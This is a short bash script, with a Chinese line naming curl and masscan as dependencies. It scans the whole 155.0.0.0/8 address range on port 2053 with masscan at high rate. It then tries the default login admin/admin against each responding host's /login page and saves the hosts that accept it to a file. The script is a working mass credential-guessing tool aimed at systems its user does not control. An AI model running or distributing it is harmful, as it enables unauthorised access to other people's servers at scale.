```
#!/bin/bash
#echo "IP range:"
#read ip_range
ip_range=155
#echo "Port"
#read port
port=2053
echo "IP range& Port=${ip_range}.0.0.0:${port}"
masscan ${ip_range}.0.0.0/8 -p${port} --banners --rate 10000 --exclude 255.255.255.255 -oJ scan.json

for ip_ad in $(sed -nE 's/.*"ip": "([^"]+)".*/\1/p' scan.json); do
    if curl --max-time 1 http://${ip_ad}:${port}; then
        res=$(curl "http://${ip_ad}:${port}/login" --data-raw 'username=admin&password=admin' --compressed --insecure)
        if [[ "$res" =~ .*:true,.* ]]; then
            echo ${ip_ad}:${port} | tee -a week.txt
        fi
        echo ${ip_ad}:${port} | tee -a all.log
    fi
done;
```
依赖的包 curl、masscan 